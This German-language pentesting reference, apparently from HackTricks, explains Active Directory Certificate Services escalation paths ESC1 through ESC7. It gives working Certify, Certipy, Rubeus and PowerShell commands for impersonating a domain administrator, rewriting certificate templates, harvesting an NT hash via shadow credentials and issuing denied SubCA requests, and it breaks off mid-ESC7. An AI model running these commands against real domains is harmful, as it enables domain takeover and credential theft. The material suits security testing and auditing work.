# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Abschnitte zu Escalation-Techniken aus den Beiträgen:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Certificate Templates - ESC1

### Erklärung

### Fehlkonfigurierte Certificate Templates - ESC1 erklärt

- **Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.**
- **Eine Genehmigung durch einen Manager ist nicht erforderlich.**
- **Unterschriften von autorisiertem Personal sind nicht erforderlich.**
- **Die Sicherheitsdeskriptoren der Certificate Templates sind übermäßig freizügig und ermöglichen Benutzern mit geringen Berechtigungen, Enrollment-Rechte zu erhalten.**
- **Certificate Templates sind so konfiguriert, dass sie EKUs definieren, die Authentifizierung ermöglichen:**
  - Es sind Extended-Key-Usage- (EKU-)Bezeichner wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder keine EKU (SubCA) enthalten.
- **Das Template erlaubt Antragstellern, eine subjectAltName in die Certificate Signing Request (CSR) aufzunehmen:**
  - Active Directory (AD) priorisiert eine im Zertifikat vorhandene subjectAltName (SAN) bei der Identitätsprüfung. Das bedeutet, dass durch Angabe der SAN in einer CSR ein Zertifikat angefordert werden kann, um sich als beliebiger Benutzer auszugeben (z. B. als Domain-Administrator). Ob der Antragsteller eine SAN angeben kann, wird im AD-Objekt des Certificate Templates durch die Eigenschaft `mspki-certificate-name-flag` festgelegt. Diese Eigenschaft ist eine Bitmaske; wenn das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` gesetzt ist, darf der Antragsteller die SAN angeben.

> [!CAUTION]
> Diese Einstellungen kennzeichnen ein mögliches ESC1-Template, aber noch keinen vollständigen Impersonation-Pfad. Prüfen Sie, ob der Ziel-Principal sich bei einer CA registrieren kann, die das Template veröffentlicht, ob Enrollment bei der CA erlaubt ist und ob das ausgestellte Zertifikat die Strong-SID-Mapping-Regeln des Authentifizierungsendpunkts erfüllt. Aktuell gepatchte KDCs können eine angeforderte UPN ablehnen, wenn die SID des Zertifikats nicht dem Ziel entspricht; siehe [Microsofts Anleitung zum Certificate Mapping](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Enrollment-Rechte für **Domain Computers** können dazu führen, dass eine vorbereitete Computeridentität berechtigt ist, selbst wenn der ursprüngliche Benutzer sich nicht registrieren kann. Prüfen Sie die Rechte des Computer-Principal separat. Prüfen Sie `msPKI-Minimal-Key-Size`, bevor Sie eine Anforderung stellen: Ein Template, das RSA-Schlüssel mit 4096 Bit voraussetzt, lehnt den 2048-Bit-Standard eines Clients ab. Eine in der Anforderung angegebene Ziel-SID kann eine SID-Abweichung nur dann ausgleichen, wenn CA und KDC das resultierende Zertifikat und dessen Mapping akzeptieren; weder Template-Flags noch eine Enroll-ACE allein belegen dies.

Diese Funktion wird manchmal aktiviert, um die bedarfsgesteuerte Erstellung von HTTPS- oder Host-Zertifikaten durch Produkte oder Deployment-Dienste zu unterstützen, oder weil das nötige Verständnis fehlt.

Es wird darauf hingewiesen, dass beim Erstellen eines Zertifikats mit dieser Option eine Warnung angezeigt wird. Dies ist nicht der Fall, wenn ein vorhandenes Certificate Template (z. B. das Template `WebServer`, bei dem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und anschließend so geändert wird, dass es eine Authentifizierungs-OID enthält.<sup>[[6]](#references)</sup>

### Ausnutzung

Um **verwundbare Certificate Templates zu finden**, können Sie Folgendes ausführen:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Um **diese Schwachstelle auszunutzen, um sich als Administrator auszugeben**, könnte man Folgendes ausführen:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Dann kannst du das generierte **Zertifikat in das Format `.pfx`** umwandeln und es erneut zur **Authentifizierung mit Rubeus oder certipy** verwenden:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Die Windows-Binärdateien „Certreq.exe“ und „Certutil.exe“ können zum Erzeugen der PFX-Datei verwendet werden: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Zertifikatvorlagen im Konfigurationsschema des AD-Forests lassen sich mit der folgenden LDAP-Abfrage aufzählen. Dabei werden insbesondere Vorlagen berücksichtigt, für die weder eine Genehmigung noch Signaturen erforderlich sind, die über eine EKU für Client Authentication oder Smart Card Logon verfügen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Fehlkonfigurierte Zertifikatvorlagen – ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
2. Die Anforderung einer Genehmigung durch den Manager ist deaktiviert.
3. Auf die erforderlichen autorisierten Signaturen wird verzichtet.
4. Ein zu freizügiger Sicherheitsdeskriptor der Zertifikatvorlage gewährt Benutzern mit geringen Berechtigungen Rechte zur Zertifikatanforderung.
5. **Die Zertifikatvorlage ist so definiert, dass sie das Any Purpose EKU oder kein EKU enthält.**

Das **Any Purpose EKU** ermöglicht es einem Angreifer, ein Zertifikat für **jeden beliebigen Zweck** zu erhalten, einschließlich Clientauthentifizierung, Serverauthentifizierung, Codesignierung usw. Zum Ausnutzen dieses Szenarios kann dieselbe **für ESC3 verwendete Technik** eingesetzt werden.

Zertifikate **ohne EKUs**, die wie untergeordnete CA-Zertifikate agieren, können für **jeden beliebigen Zweck** ausgenutzt und **auch zum Signieren neuer Zertifikate** verwendet werden. Ein Angreifer könnte daher mithilfe eines untergeordneten CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten festlegen.

Neue Zertifikate für die **Domänenauthentifizierung** funktionieren jedoch nicht, wenn der untergeordneten CA nicht vom Objekt **`NTAuthCertificates`** vertraut wird, was die Standardeinstellung ist. Ein Angreifer kann dennoch **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten für vielfältige Zwecke **missbraucht** werden (z. B. Codesignierung, Serverauthentifizierung usw.) und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk haben, etwa SAML, AD FS oder IPSec.<sup>[[6]](#references)</sup>

Um Vorlagen zu ermitteln, die in diesem Szenario dem Konfigurationsschema der AD-Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Fehlkonfigurierte Enrollment-Agent-Templates - ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, nutzt aber einen **anderen EKU** (Certificate Request Agent) und **2 verschiedene Templates** (daher gelten 2 Anforderungssätze).

Der **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, ermöglicht es einem Principal, ein **Zertifikat** **im Namen eines anderen Benutzers zu beantragen**.

Der **„Enrollment Agent“** beantragt ein Zertifikat über ein solches **Template** und verwendet das resultierende **Zertifikat, um eine CSR im Namen des anderen Benutzers mitzuunterzeichnen**. Anschließend **sendet** er die **mitunterzeichnete CSR** an die CA und beantragt ein Zertifikat über ein **Template**, das **„enroll on behalf of“ zulässt**. Die CA antwortet daraufhin mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.<sup>[[6]](#references)</sup>

**Anforderungen 1:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Anforderung einer Genehmigung durch einen Vorgesetzten ist nicht aktiviert.
- Es ist keine autorisierte Signatur erforderlich.
- Der Sicherheitsdeskriptor des Zertifikat-Templates ist übermäßig permissiv und gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Das Zertifikat-Template enthält den Certificate Request Agent EKU, wodurch Zertifikate über andere Zertifikat-Templates im Namen anderer Principals beantragt werden können.

**Anforderungen 2:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Genehmigung durch einen Vorgesetzten wird umgangen.
- Ein Ziel-Template der Version 1 kann einen Enrollment Agent ohne neuere, granulare Issuance-Policy-Steuerelemente akzeptieren. Bei Version 2 oder neuer sollten die Application-Policy-Ausstellungsanforderungen und autorisierten Signaturen geprüft werden, anstatt das Template allein aufgrund seiner Version auszuschließen.
- Ein im Zertifikat-Template definierter EKU ermöglicht Domain-Authentifizierung.
- Auf der CA werden keine Einschränkungen für Enrollment Agents angewendet.

Das Ziel-Template muss außerdem von der ausgewählten CA veröffentlicht sein, dem Zielkonto das Beantragen von Zertifikaten erlauben und den vorgesehenen Einsatz für die Domain-Authentifizierung unterstützen. Prüfe die erforderlichen Subject-/SAN-Attribute für dieses Konto. Ein Template, das beispielsweise die Subject-E-Mail-Adresse aus AD erstellt, kann kein Zertifikat für ein Konto ohne den erforderlichen `mail`-Wert ausstellen. Ein Agent-Zertifikat allein erfüllt diese Anforderungen des Ziel-Templates nicht.

### Ausnutzen

Du kannst [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Die **Benutzer**, die ein **Zertifikat eines Registrierungsagenten erhalten** dürfen, die Vorlagen, für die Registrierungs**agenten** Zertifikate beantragen dürfen, und die **Konten**, in deren Namen der Registrierungsagent handeln darf, können durch Unternehmens-CAs eingeschränkt werden. Dazu öffnet man das `certsrc.msc`-**Snap-in**, **klickt mit der rechten Maustaste auf die CA**, **klickt auf Eigenschaften** und **wechselt** dann zur Registerkarte „Enrollment Agents“.

Es ist jedoch anzumerken, dass die **Standardeinstellung** für CAs „**Do not restrict enrollment agents**“ lautet. Wenn Administratoren die Einschränkung für Registrierungsagenten aktivieren, indem sie „Restrict enrollment agents“ auswählen, bleibt die Standardkonfiguration äußerst permissiv. Sie erlaubt **Everyone**, Zertifikate für alle Vorlagen im Namen beliebiger Personen zu beantragen.

### Windows-exklusive PowerShell-PoCs mit Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) demonstriert ESC1 und ESC2/ESC3 ohne Certify oder Certipy. Die Skripte erstellen mithilfe der `X509Enrollment`-COM-API einen exportierbaren 2048-Bit-RSA-Schlüssel, erstellen eine PKCS#10-Anfrage, suchen über LDAP den ersten `pKIEnrollmentService`, übermitteln die Anfrage mit `CertificateAuthority.Request`, installieren die Antwort unter `Cert:\CurrentUser\My` und exportieren eine Base64-kodierte PFX-Datei. Das ESC1-Skript fügt einen vom Angreifer ausgewählten UPN-SAN hinzu (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, Wert `0xb`), während die ESC2/ESC3-Skripte das erste Zertifikat verwenden, um eine PKCS#7-Anfrage im Auftrag einer anderen Person zu signieren.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Die Skripte geben den Base64-Wert des **PFX** aus, das den privaten Schlüssel enthält, zur direkten Verwendung mit Rubeus. Ersetze ihn nicht durch `[Convert]::ToBase64String($cert.RawData)`: `RawData` codiert nur das öffentliche Zertifikat und kann die PKINIT-Anfrage nicht signieren.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Zugriffskontrolle für verwundbare Zertifikatvorlagen – ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** für **Zertifikatvorlagen** legt fest, über welche **Berechtigungen** bestimmte **AD-Prinzipale** für die Vorlage verfügen.

Verfügt ein **Angreifer** über die erforderlichen **Berechtigungen**, eine **Vorlage** zu **ändern** und eine der in **vorherigen Abschnitten** beschriebenen **ausnutzbaren Fehlkonfigurationen** einzurichten, kann dies eine Rechteausweitung ermöglichen.

Zu den wichtigen Berechtigungen für Zertifikatvorlagen gehören:<sup>[[6]](#references)</sup>

- **Owner:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
- **FullControl:** Gewährt vollständige Kontrolle über das Objekt, einschließlich der Möglichkeit, beliebige Attribute zu ändern.
- **WriteOwner:** Ermöglicht es, den Besitzer des Objekts in einen vom Angreifer kontrollierten Prinzipal zu ändern.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen, wodurch einem Angreifer möglicherweise FullControl gewährt werden kann.
- **WriteProperty:** Berechtigt zum Bearbeiten beliebiger Objekteigenschaften.

Überprüfen Sie außerdem die DACL des Containers `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Ein anwendbarer `CreateChild`-ACE, der auf die Klasse [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) beschränkt ist, oder umfassende vollständige Kontrolle kann das Erstellen eines neuen Vorlagenobjekts ermöglichen. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44), dass der Container diese Vorlagenobjekte enthält. Prüfen Sie passende verweigernde ACEs und die Vererbung, bevor Sie entscheiden, ob die Erstellung tatsächlich möglich ist. Eine erstellte Vorlage stellt nicht automatisch ein Zertifikat aus: Eine CA muss sie veröffentlichen, der anfordernde Prinzipal benötigt Einschreibungszugriff, und das Zertifikat muss am Authentifizierungsendpunkt der vorgesehenen Identität zugeordnet werden.

### Missbrauch

Um Prinzipale mit Bearbeitungsrechten für Vorlagen und andere PKI-Objekte zu identifizieren, führen Sie mit Certify eine Enumeration durch:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Ein Beispiel für einen Privesc-Angriff wie den vorherigen:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 liegt vor, wenn ein Benutzer Schreibrechte für eine Zertifikatvorlage hat. Dies kann beispielsweise ausgenutzt werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und sie dadurch für ESC1 anfällig zu machen.

Eine Vorlage, bei der der Antragsteller den Antragsteller-Namen angeben darf, die aber nur für die Serverauthentifizierung vorgesehen ist, ist für sich genommen keine Vorlage für die Benutzeranmeldung. Mit effektiven Rechten zur Kontrolle der Vorlage könnte ein Angreifer deren Authentifizierungs-EKUs oder Anwendungsrichtlinien ändern, bevor er ein Zertifikat beantragt; [Microsoft dokumentiert den Anmeldezweck der Smartcard-Logon-EKU](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Stelle sicher, dass eine CA die geänderte Vorlage veröffentlicht, der Antragsteller sie nutzen darf, Genehmigungs- und Signaturanforderungen erfüllt sind und das ausgestellte Zertifikat dem vorgesehenen Konto zugeordnet wird. Insbesondere lehnen [gepatchte Domänencontroller im Full-Enforcement-Modus](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) Zertifikate ohne starke Zuordnung ab; das Hinzufügen einer Ziel-UPN zu einem Antrag umgeht diese Anforderung nicht.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Rechte, aber unser Benutzer `JOHN` hat eine neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich auch diesen Angriff implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist.<sup>[[8]](#references)</sup> Hier ein kleiner Vorgeschmack auf den `shadow auto`-Befehl von Certipy, mit dem sich der NT-Hash des Opfers abrufen lässt.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. **Standardmäßig** überschreibt Certipy die Konfiguration so, dass sie für **ESC1 anfällig** ist. Wir können auch den Parameter **`-save-old` angeben, um die alte Konfiguration zu speichern**. Das ist nützlich, um die Konfiguration nach unserem Angriff **wiederherzustellen**.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Zugriffskontrolle für verwundbare PKI-Objekte – ESC5

### Erklärung

Das weitreichende Geflecht miteinander verbundener ACL-basierter Beziehungen, zu dem neben Zertifikatvorlagen und der Zertifizierungsstelle auch mehrere weitere Objekte gehören, kann die Sicherheit des gesamten AD-CS-Systems beeinträchtigen. Zu diesen sicherheitsrelevanten Objekten gehören:

- Das AD-Computerobjekt des CA-Servers, das beispielsweise über Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes untergeordnete AD-Objekt oder jeder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Container „Certificate Templates“, den Container „Certification Authorities“, das Objekt „NTAuthCertificates“ und den „Enrollment Services“-Container.

Die Sicherheit des PKI-Systems kann kompromittiert werden, wenn es einem Angreifer mit geringen Berechtigungen gelingt, eines dieser kritischen Elemente unter Kontrolle zu bringen.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 – ESC6

### Erklärung

Der [**Beitrag der CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) behandelt ebenfalls die Auswirkungen des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, wie von Microsoft beschrieben. Ist diese Einstellung auf einer Zertifizierungsstelle (CA) aktiviert, können **benutzerdefinierte Werte** in den **Subject Alternative Name** für **beliebige Anfragen** aufgenommen werden, einschließlich solcher, die aus Active Directory® erstellt wurden. Dadurch kann sich ein **Angreifer** über **jede Vorlage** registrieren, die für die **Authentifizierung** in der Domäne konfiguriert ist – insbesondere über Vorlagen, die für die Registrierung durch **Benutzer ohne besondere Berechtigungen** offenstehen, etwa die standardmäßige Vorlage „User“. So kann ein Zertifikat erlangt werden, mit dem sich der Angreifer als Domänenadministrator oder **jede andere aktive Identität** innerhalb der Domäne authentifizieren kann.<sup>[[9]](#references)</sup>

**Hinweis**: Das Hinzufügen von **alternativen Namen** zu einer Certificate Signing Request (CSR) mithilfe des Arguments `-attrib "SAN:"` in `certreq.exe` (bezeichnet als „Name Value Pairs“) unterscheidet sich von der Ausnutzungsstrategie für SANs bei ESC1. Der Unterschied liegt darin, **wie Kontoinformationen eingebettet werden** – in einem Zertifikattribut statt in einer Erweiterung.

### Abuse

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Dieser Vorgang nutzt im Wesentlichen **remote registry access**; daher könnte ein alternativer Ansatz sein:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Um diese Einstellungen zu ändern, kann folgender Befehl von jeder Workstation aus ausgeführt werden, sofern man über **Domänenadministratorrechte** oder gleichwertige Berechtigungen verfügt:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das Flag entfernt werden:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Nach den Sicherheitsupdates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die Eigenschaft `objectSid` des **Anfragestellers** einbindet. Bei ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** entspricht die SID jedoch der **`objectSid` des Anfragestellers** und nicht dem SAN.\
> Um ESC6 auszunutzen, muss das System anfällig für ESC10 (Weak Certificate Mappings) sein, bei dem das **SAN gegenüber der neuen Sicherheitserweiterung bevorzugt wird**.

## Zugriffskontrolle der anfälligen Zertifizierungsstelle - ESC7

### Angriff 1

#### Erklärung

Die Zugriffskontrolle für eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen geregelt, die CA-Aktionen steuern. Diese Berechtigungen können angezeigt werden, indem man `certsrv.msc` öffnet, mit der rechten Maustaste auf eine CA klickt, Eigenschaften auswählt und dann zum Tab „Sicherheit“ navigiert. Außerdem lassen sich Berechtigungen mithilfe des PSPKI-Moduls mit Befehlen wie den folgenden enumerieren:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This bietet Einblicke in die wichtigsten Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen „CA-Administrator“ bzw. „Zertifikatsmanager“ entsprechen.<sup>[[6]](#references)</sup>

#### Missbrauch

Mit **`ManageCA`**-Rechten für eine Zertifizierungsstelle kann der Prinzipal Einstellungen remote mithilfe von PSPKI ändern. Dazu gehört das Aktivieren des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, damit SAN-Angaben in beliebigen Vorlagen möglich sind – ein entscheidender Aspekt der Domain-Eskalation.

Dieser Vorgang lässt sich mit dem Cmdlet **Enable-PolicyModuleFlag** von PSPKI vereinfachen, sodass Änderungen ohne direkte Interaktion mit der GUI vorgenommen werden können.

Mit **`ManageCertificates`**-Rechten können ausstehende Anfragen genehmigt und damit die Sicherheitsmaßnahme „Genehmigung durch den CA-Zertifikatsmanager“ umgangen werden.

Mithilfe einer Kombination aus den Modulen **Certify** und **PSPKI** lassen sich Zertifikate beantragen, genehmigen und herunterladen:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Angriff 2

#### Erklärung

> [!WARNING]
> Beim **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um das Flag **EDITF_ATTRIBUTESUBJECTALTNAME2** zu **aktivieren** und den **ESC6-Angriff** durchzuführen. Dies hat jedoch erst dann Auswirkungen, wenn der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer über das Zugriffsrecht `Manage CA` verfügt, darf er auch **den Dienst neu starten**. Das **bedeutet jedoch nicht, dass der Benutzer den Dienst remote neu starten kann**. Außerdem funktioniert E**SC6 in den meisten gepatchten Umgebungen möglicherweise nicht direkt** – aufgrund der Sicherheitsupdates vom Mai 2022.

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

- Nur die Berechtigung **`ManageCA`**
- Berechtigung **`Manage Certificates`** (kann über **`ManageCA`** erteilt werden)
- Die Zertifikatvorlage **`SubCA`** muss **aktiviert** sein (kann über **`ManageCA`** aktiviert werden)

Die Technik beruht darauf, dass Benutzer mit den Zugriffsrechten `Manage CA` _und_ `Manage Certificates` **fehlgeschlagene Zertifikatanforderungen ausstellen** können. Die Zertifikatvorlage **`SubCA`** ist **anfällig für ESC1**, aber nur **Administratoren** können sich für die Vorlage registrieren. Daher kann ein **Benutzer** die Registrierung für **`SubCA`** **anfordern** – was **abgelehnt** wird –, die Anforderung kann **anschließend jedoch vom Manager ausgestellt werden**.<sup>[[6]](#references)</sup>

#### Missbrauch

Sie können sich selbst das Zugriffsrecht **`Manage Certificates`** erteilen, indem Sie Ihren Benutzer als neuen Officer hinzufügen.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Die **`SubCA`**-Vorlage kann auf der CA mit dem Parameter `-enable-template` **aktiviert** werden. Standardmäßig ist die `SubCA`-Vorlage aktiviert.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir damit beginnen, **ein Zertifikat auf Basis der Vorlage `SubCA` anzufordern**.

**Dieser Antrag wird abgelehnt**, aber wir speichern den privaten Schlüssel und notieren die Anforderungs-ID.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Mit unseren **`Manage CA` und `Manage Certificates`** können wir dann die fehlgeschlagene Zertifikatsanforderung mit dem Befehl `ca` und dem Parameter `-issue-request <request ID>` ausstellen.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

